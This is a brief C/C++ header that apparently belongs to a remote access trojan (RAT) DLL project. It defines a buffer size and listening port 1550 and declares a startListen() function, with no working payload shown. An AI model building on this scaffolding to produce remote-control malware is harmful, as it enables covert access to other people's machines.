#pragma once // Preprocessor directive - current source file to be included only once during compilation (same as header guards)

#define _CRT_SECURE_NO_WARNINGS // yolo

#include "RAT-Dll-Main.h"


const INT DEFAULT_BUF_LEN = 512;
const INT PORT_NUM = 1550;

INT startListen();
